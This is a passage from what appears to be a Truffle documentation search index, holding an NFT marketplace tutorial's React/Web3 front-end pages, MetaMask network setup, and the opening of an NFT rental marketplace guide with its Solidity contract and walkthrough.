([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () // Get all listed NFTs const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ) const listings = await marketPlaceContract . methods . getListedNfts (). call () // Iterate over the listed NFTs and retrieve their metadata const nfts = await Promise . all ( listings . map ( async ( i ) => { try { const boredPetsContract = new web3 . eth . Contract ( BoredPetsNFT . abi , BoredPetsNFT . networks [ networkId ]. address ) const tokenURI = await boredPetsContract . methods . tokenURI ( i . tokenId ). call () const meta = await axios . get ( tokenURI ) const nft = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . buyer , image : meta . data . image , name : meta . data . name , description : meta . data . description , } return nft } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } async function buyNft ( nft ) { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId (); const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ); const accounts = await web3 . eth . getAccounts (); await marketPlaceContract . methods . buyNft ( BoredPetsNFT . networks [ networkId ]. address , nft . tokenId ). send ({ from : accounts [ 0 ], value : nft . price }); loadNFTs () } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"px-20 py-10 text-3xl\" > No pets available !< /h1>) } else { return ( < div className = \"flex justify-center\" > < div className = \"px-4\" style = { { maxWidth : '1600px' } } > < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } /> < div className = \"p-4\" > < p style = { { height : '64px' } } className = \"text-2xl font-semibold\" > { nft . name } < /p> < div style = { { height : '70px' , overflow : 'hidden' } } > < p className = \"text-gray-400\" > { nft . description } < /p> < /div> < /div> < div className = \"p-4 bg-black\" > < p className = \"text-2xl font-bold text-white\" > { Web3 . utils . fromWei ( nft . price , \"ether\" )} ETH < /p> < button className = \"mt-4 w-full bg-teal-400 text-white font-bold py-2 px-12 rounded\" onClick = {() => buyNft ( nft )} > Buy < /button> < /div> < /div> )) } < /div> < /div> < /div> ) } }", "title": "index.js"}, {"location": "guides/nft-marketplace/#create-and-list-nftjs", "text": "This is the Sell tab, where a user can create and list an NFT. Make sure you replace with the dedicated gateway name you create in your IPFS project on Infura. You'll also need to add in your IPFS API and Secret to create our IPFS client. To do so, create .env.local in your client folder. Then, populate it with these values: NEXT_PUBLIC_IPFS_SECRET = NEXT_PUBLIC_IPFS_PROJECT_ID = Then, copy paste this code: import { useState } from 'react' import Web3 from 'web3' import Web3Modal from 'web3modal' import { useRouter } from 'next/router' import { create as ipfsHttpClient } from 'ipfs-http-client' import Marketplace from '../contracts/optimism-contracts/Marketplace.json' import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' const projectId = process . env [ \"NEXT_PUBLIC_IPFS_KEY\" ]; const projectSecret = process . env [ \"NEXT_PUBLIC_IPFS_PROJECT_ID\" ]; const auth = 'Basic ' + Buffer . from ( projectId + ':' + projectSecret ). toString ( 'base64' ); const client = ipfsHttpClient ({ host : 'ipfs.infura.io' , port : 5001 , protocol : 'https' , headers : { authorization : auth , }, }); export default function CreateItem () { const [ fileUrl , setFileUrl ] = useState ( null ) const [ formInput , updateFormInput ] = useState ({ price : '' , name : '' , description : '' }) const router = useRouter () async function onChange ( e ) { // upload image to IPFS const file = e . target . files [ 0 ] try { const added = await client . add ( file , { progress : ( prog ) => console . log ( `received: ${ prog } ` ) } ) const url = `https://<DEDICATED_GATEWAY>.infura-ipfs.io/ipfs/ ${ added . path } ` setFileUrl ( url ) } catch ( error ) { console . log ( 'Error uploading file: ' , error ) } } async function uploadToIPFS () { const { name , description , price } = formInput if ( ! name || ! description || ! price || ! fileUrl ) { return } else { // first, upload metadata to IPFS const data = JSON . stringify ({ name , description , image : fileUrl }) try { const added = await client . add ( data ) console . log ( 'added: ' , added ) const url = `https://<DEDICATED_GATEWAY>.infura-ipfs.io/ipfs/ ${ added . path } ` // after metadata is uploaded to IPFS, return the URL to use it in the transaction return url } catch ( error ) { console . log ( 'Error uploading file: ' , error ) } } } async function listNFTForSale () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const url = await uploadToIPFS () const networkId = await web3 . eth . net . getId () // Mint the NFT const boredPetsContractAddress = BoredPetsNFT . networks [ networkId ]. address const boredPetsContract = new web3 . eth . Contract ( BoredPetsNFT . abi , boredPetsContractAddress ) const accounts = await web3 . eth . getAccounts () const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ) let listingFee = await marketPlaceContract . methods . LISTING_FEE (). call () listingFee = listingFee . toString () boredPetsContract . methods . mint ( url ). send ({ from : accounts [ 0 ] }). on ( 'receipt' , function ( receipt ) { console . log ( 'minted' ); // List the NFT const tokenId = receipt . events . NFTMinted . returnValues [ 0 ]; marketPlaceContract . methods . listNft ( boredPetsContractAddress , tokenId , Web3 . utils . toWei ( formInput . price , \"ether\" )) . send ({ from : accounts [ 0 ], value : listingFee }). on ( 'receipt' , function () { console . log ( 'listed' ) router . push ( '/' ) }); }); } return ( < div className = \"flex justify-center\" > < div className = \"w-1/2 flex flex-col pb-12\" > < input placeholder = \"Asset Name\" className = \"mt-8 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , name : e . target . value })} /> < textarea placeholder = \"Asset Description\" className = \"mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , description : e . target . value })} /> < input placeholder = \"Asset Price in Eth\" className = \"mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , price : e . target . value })} /> < input type = \"file\" name = \"Asset\" className = \"my-4\" onChange = { onChange } /> { fileUrl && ( < img className = \"rounded mt-4\" width = \"350\" src = { fileUrl } /> ) } < button onClick = { listNFTForSale } className = \"font-bold mt-4 bg-teal-400 text-white rounded p-4 shadow-lg\" > Mint and list NFT < /button> < /div> < /div> ) }", "title": "create-and-list-nft.js"}, {"location": "guides/nft-marketplace/#my-nftsjs", "text": "This is the My NFTs tab, where the user can see the NFTs they own and choose to resell. import Web3 from 'web3' ; import { useEffect , useState } from 'react' import axios from 'axios' import Web3Modal from 'web3modal' import { useRouter } from 'next/router' import Marketplace from '../contracts/optimism-contracts/Marketplace.json' ; import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' ; export default function MyAssets () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) const router = useRouter () useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ) const boredPetsContractAddress = BoredPetsNFT . networks [ networkId ]. address const boredPetsContract = new web3 . eth . Contract ( BoredPetsNFT . abi , boredPetsContractAddress ) const accounts = await web3 . eth . getAccounts () const data = await marketPlaceContract . methods . getMyNfts (). call ({ from : accounts [ 0 ]}) const nfts = await Promise . all ( data . map ( async i => { try { const tokenURI = await boredPetsContract . methods . tokenURI ( i . tokenId ). call () const meta = await axios . get ( tokenURI ) let nft = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . buyer , image : meta . data . image , name : meta . data . name , description : meta . data . description , tokenURI : tokenURI } return nft } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } function listNFT ( nft ) { router . push ( `/resell-nft?id= ${ nft . tokenId } &tokenURI= ${ nft . tokenURI } ` ) } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"py-10 px-20 text-3xl\" > No NFTs owned < /h1>); } else { return ( < div className = \"flex justify-center\" > < div className = \"p-4\" > < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } className = \"rounded\" /> < div className = \"p-4\" > < p style = { { height : '64px' } } className = \"text-2xl font-semibold\" > { nft . name } < /p> < div style = { { height : '70px' , overflow : 'hidden' } } > < p className = \"text-gray-400\" > { nft . description } < /p> < /div> < /div> < div className = \"p-4 bg-black\" > < p className = \"text-2xl font-bold text-white\" > Price - { Web3 . utils . fromWei ( nft . price , \"ether\" )} Eth < /p> < button className = \"mt-4 w-full bg-teal-400 text-white font-bold py-2 px-12 rounded\" onClick = {() => listNFT ( nft )} > List < /button> < /div> < /div> )) } < /div> < /div> < /div> ); } }", "title": "my-nfts.js"}, {"location": "guides/nft-marketplace/#resell-nftjs", "text": "This is the page the user is directed to to resell their NFTs. import { useEffect , useState } from 'react' import Web3 from 'web3' import { useRouter } from 'next/router' import axios from 'axios' import Web3Modal from 'web3modal' import Marketplace from '../contracts/optimism-contracts/Marketplace.json' import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' export default function ResellNFT () { const [ formInput , updateFormInput ] = useState ({ price : '' , image : '' }) const router = useRouter () const { id , tokenURI } = router . query const { image , price } = formInput useEffect (() => { fetchNFT () }, [ id ]) async function fetchNFT () { if ( ! tokenURI ) { return } else { const meta = await axios . get ( tokenURI ) updateFormInput ( state => ({ ... state , image : meta . data . image })) } } async function listNFTForSale () { if ( ! price ) { return } else { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ) let listingFee = await marketPlaceContract . methods . LISTING_FEE (). call () listingFee = listingFee . toString () const accounts = await web3 . eth . getAccounts () marketPlaceContract . methods . resellNft ( BoredPetsNFT . networks [ networkId ]. address , id , Web3 . utils . toWei ( formInput . price , \"ether\" )) . send ({ from : accounts [ 0 ], value : listingFee }). on ( 'receipt' , function () { router . push ( '/' ) }); } } return ( < div className = \"flex justify-center\" > < div className = \"w-1/2 flex flex-col pb-12\" > < input placeholder = \"Asset Price in Eth\" className = \"mt-2 border rounded p-4\" onChange = { e => updateFormInput ({ ... formInput , price : e . target . value })} /> { image && ( < img className = \"rounded mt-4\" width = \"350\" src = { image } /> ) } < button onClick = { listNFTForSale } className = \"font-bold mt-4 bg-teal-400 text-white rounded p-4 shadow-lg\" > List NFT < /button> < /div> < /div> ) }", "title": "resell-nft.js"}, {"location": "guides/nft-marketplace/#my-listed-nftsjs", "text": "This is the My Listed NFTs tab, where users can see what NFTs they have listed for sale. import Web3 from 'web3' ; import { useEffect , useState } from 'react' ; import axios from 'axios' ; import Web3Modal from 'web3modal' ; import Marketplace from '../contracts/optimism-contracts/Marketplace.json' ; import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' ; export default function CreatorDashboard () { const [ nfts , setNfts ] = useState ([]) const [ loadingState , setLoadingState ] = useState ( 'not-loaded' ) useEffect (() => { loadNFTs () }, []) async function loadNFTs () { const web3Modal = new Web3Modal () const provider = await web3Modal . connect () const web3 = new Web3 ( provider ) const networkId = await web3 . eth . net . getId () // Get listed NFTs const marketPlaceContract = new web3 . eth . Contract ( Marketplace . abi , Marketplace . networks [ networkId ]. address ) const accounts = await web3 . eth . getAccounts () const listings = await marketPlaceContract . methods . getMyListedNfts (). call ({ from : accounts [ 0 ]}) // Iterate over my listed NFTs and retrieve their metadata const nfts = await Promise . all ( listings . map ( async i => { try { const boredPetsContract = new web3 . eth . Contract ( BoredPetsNFT . abi , BoredPetsNFT . networks [ networkId ]. address ) const tokenURI = await boredPetsContract . methods . tokenURI ( i . tokenId ). call (); const meta = await axios . get ( tokenURI ); let item = { price : i . price , tokenId : i . tokenId , seller : i . seller , owner : i . owner , image : meta . data . image , } return item } catch ( err ) { console . log ( err ) return null } })) setNfts ( nfts . filter ( nft => nft !== null )) setLoadingState ( 'loaded' ) } if ( loadingState === 'loaded' && ! nfts . length ) { return ( < h1 className = \"py-10 px-20 text-3xl\" > No NFTs listed < /h1>) } else { return ( < div > < div className = \"p-4\" > < h2 className = \"text-2xl py-2\" > Items Listed < /h2> < div className = \"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 pt-4\" > { nfts . map (( nft , i ) => ( < div key = { i } className = \"border shadow rounded-xl overflow-hidden\" > < img src = { nft . image } className = \"rounded\" /> < div className = \"p-4 bg-black\" > < p className = \"text-2xl font-bold text-white\" > Price - { Web3 . utils . fromWei ( nft . price , \"ether\" )} Eth < /p> < /div> < /div> )) } < /div> < /div> < /div> ) } }", "title": "my-listed-nfts.js"}, {"location": "guides/nft-marketplace/#web3-client-overview", "text": "Let's go over the Web3 concepts and utilities we've used to hook up our front end. web3Modal is a library we use to retrieve the user's network provider ipfs-http-client is a library we use to upload the NFTs metadata to IPFS web3 is a library that allows us to use our smart contract abstractions Depending on if you want to use your Optimism contracts or your Ethereum contracts, you'll change the contract import path: import Marketplace from '../contracts/optimism-contracts/Marketplace.json' import BoredPetsNFT from '../contracts/optimism-contracts/BoredPetsNFT.json' When we call our contract methods with Web3.js , we use call when we don't alter the contract state, and send when we do. You can read more about it here .", "title": "Web3 Client Overview"}, {"location": "guides/nft-marketplace/#deploy-your-front-end", "text": "To see the front end in action, just use the node scripts in package.json . Run npm run dev from the client folder, and your website should be brought up on http://localhost:3000/ ! Note that the front end will be using whatever network and account is set on your MetaMask extension.", "title": "Deploy Your Front End"}, {"location": "guides/nft-marketplace/#adding-ganache-to-metamask", "text": "If you would like to use Ganache as your network, you can add the network to your MetaMask wallet with the following properties: Network Name: Ganache New RPC URL: http://127.0.0.1:7545 Chain ID: 1337 Currency Symbol: ETH Then, import a new account. If you are using the Ganache UI, you can grab the private key by clicking on the key icon to reveal the account keys.", "title": "Adding Ganache to MetaMask"}, {"location": "guides/nft-marketplace/#adding-optimistic-ethereum-to-metamask", "text": "If you would like to use your local instance of Optimism, you can add the network to your MetaMask wallet with the following properties: Network Name: Optimistic Ethereum New RPC URL: http://127.0.0.1:8545 Chain ID: 17 Currency Symbol: ETH Then, import a new account. You can get the list of accounts and private keys here .", "title": "Adding Optimistic Ethereum to MetaMask"}, {"location": "guides/nft-marketplace/#additional-notes", "text": "And there you have it - a very basic marketplace! There are many ways you can build upon this project: - Allow users to bid on an NFT - Allow useres to delist their NFTs - Combining the Marketplace contract and NFT contract into one - Bridging the Optimism contracts (Truffle L2 bridge box coming soon!) If you're interested in actually bridging between Ethereum and Optimism, check out our Optimism Bridge Box ! Join Github Discussions to join the Truffle community to discuss and ask questions!", "title": "Additional Notes"}, {"location": "guides/nft-rental-marketplace/", "text": "Web3 Unleashed: Build a NFT Rental Marketplace Part 1 \u00b6 Written by Emily Lin Last updated 9/15/2022 Overview \u00b6 In episode 2, we covered rentable NFTs (see the tutorial here ). Please go over this beforehand for an explanation of that code. In this guide, we'll create a rental marketplace that will allow users to list and rent rentable NFTs! Specifically, we'll cover: Starting a project using the Truffle React box to prepare for building a frontend in part 2 Writing a rental marketplace contract that will interact with rentable NFTs Deploying contracts that are dependent on each other Writing tests Verifying the RentablePets contract using truffle-plugin-verify on Goerli Etherscan Using Ganache forking and unlocking your MetaMask account locally to test the marketplace contract with already deployed contracts Writing Truffle scripts for fast testing Watch the livestream on YouTube for a more in-depth walkthrough with advanced debugging examples! The completed code lives here . Download System Requirements \u00b6 You'll need to install: Node.js , v14 or higher truffle ganache CLI Create an Infura account and project \u00b6 To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it rentable-nft , and select Web3 API from the dropdown Register for a MetaMask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask wallet. You can download it and create one here . Download VS Code \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here . Get Some Test Eth \u00b6 In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once. Set Up Your Project \u00b6 Since the end goal is a full stack rental marketplace, we'll be starting with Truffle's React Box ! truffle unbox react rental_marketplace cd rental_marketplace Your file structure should look something like this: \u251c\u2500\u2500 LICENSE \u251c\u2500\u2500 README.md \u251c\u2500\u2500 client \u2502 \u251c\u2500\u2500 README.md \u2502 \u251c\u2500\u2500 node_modules \u2502 \u251c\u2500\u2500 package-lock.json \u2502 \u251c\u2500\u2500 package.json \u2502 \u251c\u2500\u2500 public \u2502 \u2514\u2500\u2500 src \u2514\u2500\u2500 truffle \u251c\u2500\u2500 contracts \u251c\u2500\u2500 migrations \u251c\u2500\u2500 package-lock.json \u251c\u2500\u2500 package.json \u251c\u2500\u2500 scripts \u251c\u2500\u2500 test \u2514\u2500\u2500 truffle-config.js We'll only be working with contracts, so hop into the truffle directory. We'll also be using OpenZeppelin's base contracts and test helpers, so let's install that now too. cd truffle npm i @openzeppelin/contracts npm i -D @openzeppelin/test-helpers Copy over the rentable NFT Contracts \u00b6 Our marketplace will only allow NFTs that fulfill the ERC4907 standard to be listed, so we will also provide users a way to mint their own rentable NFTs. To do so, copy over the contracts we created in the second episode of Web3 Unleashed and delete the existing SimpleStorage contract from the box: IERC4907 ERC4907 RentablePets Also copy: test_rentable_pets.js 1_deploy_contracts.js Also, since we are providing a generic rentable NFT for users to mint, let's rename RentablePets.sol to RentableNft.sol , and change all occurrences of RentablePets to RentableNft in the contract, migration, and test! Your file structure should look like this: \u251c\u2500\u2500 contracts \u2502 \u251c\u2500\u2500 ERC4907.sol \u2502 \u251c\u2500\u2500 IERC4907.sol \u2502 \u2514\u2500\u2500 RentableNft.sol \u251c\u2500\u2500 migrations \u2502 \u2514\u2500\u2500 1_deploy_simple_storage.js \u251c\u2500\u2500 package-lock.json \u251c\u2500\u2500 package.json \u251c\u2500\u2500 scripts \u2502 \u2514\u2500\u2500 increment.js \u251c\u2500\u2500 test \u2502 \u2514\u2500\u2500 test_rentable_nft.js \u2514\u2500\u2500 truffle-config.js Quickly run a truffle test to see if everything was set up correctly. Write the Marketplace Smart Contract \u00b6 With that out of the way, let's get started on our marketplace smart contract! Create a new contract called Marketplace.sol : truffle create contract Marketplace This contract will be long! It's completed form will look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; import \"@openzeppelin/contracts/interfaces/IERC165.sol\" ; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\" ; import \"@openzeppelin/contracts/interfaces/IERC721.sol\" ; import \"./IERC4907.sol\" ; contract Marketplace is ReentrancyGuard { using Counters for Counters . Counter ; using EnumerableSet for EnumerableSet . AddressSet ; using EnumerableSet for EnumerableSet . UintSet ; Counters . Counter private _nftsListed ; address private _marketOwner ; uint256 private _listingFee = .001 ether ; // maps contract address to token id to properties of the rental listing mapping ( address => mapping ( uint256 => Listing )) private _listingMap ; // maps nft contracts to set of the tokens that are listed mapping ( address => EnumerableSet . UintSet ) private _nftContractTokensMap ; // tracks the nft contracts that have been listed EnumerableSet . AddressSet private _nftContracts ; struct Listing { address owner ; address user ; address nftContract ; uint256 tokenId ; uint256 pricePerDay ; uint256 startDateUNIX ; // when the nft can start being rented uint256 endDateUNIX ; // when the nft can no longer be rented uint256 expires ; // when the user can no longer rent it } event NFTListed ( address owner , address user , address nftContract , uint256 tokenId , uint256 pricePerDay , uint256 startDateUNIX , uint256 endDateUNIX , uint256 expires ); event NFTRented ( address owner , address user , address nftContract , uint256 tokenId , uint256 startDateUNIX , uint256 endDateUNIX , uint64 expires , uint256 rentalFee ); event NFTUnlisted ( address unlistSender , address nftContract , uint256 tokenId , uint256 refund ); constructor () { _marketOwner = msg . sender ; } // function to list NFT for rental function listNFT ( address nftContract , uint256 tokenId , uint256 pricePerDay , uint256 startDateUNIX , uint256 endDateUNIX ) public payable nonReentrant { require ( isRentableNFT ( nftContract ), \"Contract is not an ERC4907\" ); require ( IERC721 ( nftContract ). ownerOf ( tokenId ) == msg . sender , \"Not owner of nft\" ); require ( msg . value == _listingFee , \"Not enough ether for listing fee\" ); require ( pricePerDay > 0 , \"Rental price should be greater than 0\" ); require ( startDateUNIX >= block . timestamp , \"Start date cannot be in the past\" ); require ( endDateUNIX >= startDateUNIX , \"End date cannot be before the start date\" ); require ( _listingMap [ nftContract ][ tokenId ]. nftContract == address ( 0 ), \"This NFT has already been listed\" ); payable ( _marketOwner ). transfer ( _listingFee ); _listingMap [ nftContract ][ tokenId ] = Listing ( msg . sender , address ( 0 ), nftContract , tokenId , pricePerDay , startDateUNIX , endDateUNIX , 0 ); _nftsListed . increment (); EnumerableSet . add ( _nftContractTokensMap [ nftContract ], tokenId ); EnumerableSet . add ( _nftContracts , nftContract ); emit NFTListed ( IERC721 ( nftContract ). ownerOf ( tokenId ), address ( 0 ), nftContract , tokenId , pricePerDay , startDateUNIX , endDateUNIX , 0 ); } // function to rent NFT function rentNFT ( address nftContract , uint256 tokenId , uint64 expires ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . user == address ( 0 ) || block . timestamp > listing . expires , \"NFT already rented\" ); require ( expires <= listing . endDateUNIX , \"Rental period exceeds max date rentable\" ); // Transfer rental fee uint256 numDays = ( expires - block . timestamp ) / 60 / 60 / 24 + 1 ; uint256 rentalFee = listing . pricePerDay * numDays ; require ( msg . value >= rentalFee , \"Not enough ether to cover rental period\" ); payable ( listing . owner ). transfer ( rentalFee ); // Update listing IERC4907 ( nftContract ). setUser ( tokenId , msg . sender , expires ); listing . user = msg . sender ; listing . expires = expires ; emit NFTRented ( IERC721 ( nftContract ). ownerOf ( tokenId ), msg . sender , nftContract , tokenId , listing . startDateUNIX , listing . endDateUNIX , expires , rentalFee ); } // function to unlist your rental, refunding the user for any lost time function unlistNFT ( address nftContract , uint256 tokenId ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . owner != address ( 0 ), \"This NFT is not listed\" ); require ( listing . owner == msg . sender || _marketOwner == msg . sender , \"Not approved to unlist NFT\" ); // fee to be returned to user if unlisted before rental period is up // nothing to refund if no renter uint256 refund = 0 ; if ( listing . user != address ( 0 )) { refund = (( listing . expires - block . timestamp ) / 60 / 60 / 24 + 1 ) * listing . pricePerDay ; require ( msg . value >= refund , \"Not enough ether to cover refund\" ); payable ( listing . user ). transfer ( refund ); } // clean up data IERC4907 ( nftContract ). setUser ( tokenId , address ( 0 ), 0 ); EnumerableSet . remove ( _nftContractTokensMap [ nftContract ], tokenId ); delete _listingMap [ nftContract ][ tokenId ]; if ( EnumerableSet . length ( _nftContractTokensMap [ nftContract ]) == 0 ) { EnumerableSet . remove ( _nftContracts , nftContract ); } _nftsListed . decrement (); emit NFTUnlisted ( msg . sender , nftContract , tokenId , refund ); } /* * function to get all listings * * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that * this function has an unbounded cost, and using it as part of a state-changing function may render the function * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block. */ function getAllListings () public view returns ( Listing [] memory ) { Listing [] memory listings = new Listing []( _nftsListed . current ()); uint256 listingsIndex = 0 ; address [] memory nftContracts = EnumerableSet . values ( _nftContracts ); for ( uint i = 0 ; i < nftContracts . length ; i ++ ) { address nftAddress = nftContracts [ i ]; uint256 [] memory tokens = EnumerableSet . values ( _nftContractTokensMap [ nftAddress ]); for ( uint j = 0 ; j < tokens . length ; j ++ ) { listings [ listingsIndex ] = _listingMap [ nftAddress ][ tokens [ j ]]; listingsIndex ++ ; } } return listings ; } function getListingFee () public view returns ( uint256 ) { return _listingFee ; } function isRentableNFT ( address nftContract ) public view returns ( bool ) { bool _isRentable = false ; bool _isNFT = false ; try IERC165 ( nftContract ). supportsInterface ( type ( IERC4907 ). interfaceId ) returns ( bool rentable ) { _isRentable = rentable ; } catch { return false ; } try IERC165 ( nftContract ). supportsInterface ( type ( IERC721 ). interfaceId ) returns ( bool nft ) { _isNFT = nft ; } catch { return false ; } return _isRentable && _isNFT ; } } Let's walk through the code piece by piece! Imports \u00b6 import \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; import \"@openzeppelin/contracts/interfaces/IERC165.sol\" ; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\" ; import \"@openzeppelin/contracts/interfaces/IERC721.sol\" ; import \"./IERC4907.sol\" ; If you followed our guide in episode 2 , you should be familiar with the Counters , IERC165 , IERC721 , and IERC4907 , and Counters contracts. We're using two new ones here: EnumerableSet is a nifty utility contract that will help us with storing our rental listings ReentrancyGuard is a contract we can inherit to protect our contract from reentrancy attacks since we will be transferring ETHer between accounts In order to use ReentrancyGuard , we want Marketplace to inherit ReentrancyGuard : contract Marketplace is ReentrancyGuard { Contract Variables \u00b6 using Counters for Counters . Counter ; using EnumerableSet for EnumerableSet . AddressSet ; using EnumerableSet for EnumerableSet . UintSet ; This is just syntactic sugar for using these contracts. You can read more about it here . address private _marketOwner ; uint256 private _listingFee = .001 ether ; In our marketplace, we want to pass a listing fee to the owner of the marketplace contract any time a NFT rental is listed. Counters . Counter private _nftsListed ; // maps contract address to token id to properties of the rental listing mapping ( address => mapping ( uint256 => Listing )) private _listingMap ; // maps nft contracts to set of the tokens that are listed mapping ( address => EnumerableSet . UintSet ) private _nftContractTokensMap ; // tracks the nft contracts that have been listed EnumerableSet . AddressSet private _nftContracts ; This next set of code is for how we are storing the listing data. Solidity doesn't allow for map iterability, so we have to do some creative workarounds here. Namely, we store the keys we would iterate over in OpenZeppelin's EnumerableSet . How it is used will become more obvious when we go over getAllListings . _nftsListed simply tracks how many nfts are currently listed. _listingMap is a map of maps that will give us listing information for a specific tokenId in an NFT contract. _nftContractTokensMap will tell us all the tokenIds listed from a particular NFT contract. _nftContracts is a set of all the NFT contracts that have been listed. struct Listing { address owner ; address user ; address nftContract ; uint256 tokenId ; uint256 pricePerDay ; uint256 startDateUNIX ; // when the nft can start being rented uint256 endDateUNIX ; // when the nft can no longer be rented uint256 expires ; // when the user can no longer rent it } event NFTListed ( address owner , address user , address nftContract , uint256 tokenId , uint256 pricePerDay , uint256 startDateUNIX , uint256 endDateUNIX , uint256 expires ); event NFTRented ( address owner , address user , address nftContract , uint256 tokenId , uint256 startDateUNIX , uint256 endDateUNIX , uint64 expires , uint256 rentalFee ); event NFTUnlisted ( address unlistSender , address nftContract , uint256 tokenId , uint256 refund ); These last variables are just the data we want to store and emit about a particular listing. Specifically: owner is the address of the token owner user is the address of the user (i.e., renter). If there is none, it is the zero address nftContract is the NFT contract address (i.e., the NFT collection) tokenId is the tokenId of the listed NFT within the NFT collection pricePerDay is how much wei it costs to rent the NFT for one day startDateUNIX is the UNIX timestamp for when the NFT is ready to be rented endDateUNIX is the UNIX timestamp for when the NFT should no longer be rentable expires is when the rental period for a user will end. If there is no renter, this is 0 rentalFee is how much it costed to rent the NFT refund is for when the owner decides to unlist their NFT while someone is still renting it. In this case, the owner must refund the user however many days before the rental period was supposed to end. Modify the Marketplace Constructor \u00b6 Since we want to pass a listing fee to the marketplace owner whenever an NFT is listed, we'll need to store that information upon deployment. Modify the constructor as follows: constructor () { _marketOwner = msg . sender ; } Write listNFT() \u00b6 // function to list NFT for rental function listNFT ( address nftContract , uint256 tokenId , uint256 pricePerDay , uint256 startDateUNIX , uint256 endDateUNIX ) public payable nonReentrant { require ( isRentableNFT ( nftContract ), \"Contract is not an ERC4907\" ); require ( IERC721 ( nftContract ). ownerOf ( tokenId ) == msg . sender , \"Not owner of nft\" ); require ( msg . value == _listingFee , \"Not enough ether for listing fee\" ); require ( pricePerDay > 0 , \"Rental price should be greater than 0\" ); require ( startDateUNIX >= block . timestamp , \"Start date cannot be in the past\" ); require ( endDateUNIX >= startDateUNIX , \"End date cannot be before the start date\" ); require ( _listingMap [ nftContract ][ tokenId ]. nftContract == address ( 0 ), \"This NFT has already been listed\" ); payable ( _marketOwner ). transfer ( _listingFee ); _listingMap [ nftContract ][ tokenId ] = Listing ( msg . sender , address ( 0 ), nftContract , tokenId , pricePerDay , startDateUNIX , endDateUNIX , 0 ); _nftsListed . increment (); EnumerableSet . add ( _nftContractTokensMap [ nftContract ], tokenId ); EnumerableSet . add ( _nftContracts , nftContract ); emit NFTListed ( IERC721 ( nftContract ). ownerOf ( tokenId ), address ( 0 ), nftContract , tokenId , pricePerDay , startDateUNIX , endDateUNIX , 0 ); } listNFT requires that: the NFT is ERC4907 and ERC721 compliant the owner of the NFT is listing it the listing properties (i.e. price, start date, end date) are valid values the owner has enough ETH to cover the listing fee the NFT has not already been listed We create a helper method isRentableNFT to check for the token standard compliance: function isRentableNFT ( address nftContract ) public view returns ( bool ) { bool _isRentable = false ; bool _isNFT = false ; try IERC165 ( nftContract ). supportsInterface ( type ( IERC4907 ). interfaceId ) returns ( bool rentable ) { _isRentable = rentable ; } catch { return false ; } try IERC165 ( nftContract ). supportsInterface ( type ( IERC721 ). interfaceId ) returns ( bool nft ) { _isNFT = nft ; } catch { return false ; } return _isRentable && _isNFT ; } In particular, we check using Solidity's try catch syntax, since it is possible that the contract passed in does not support the ERC165 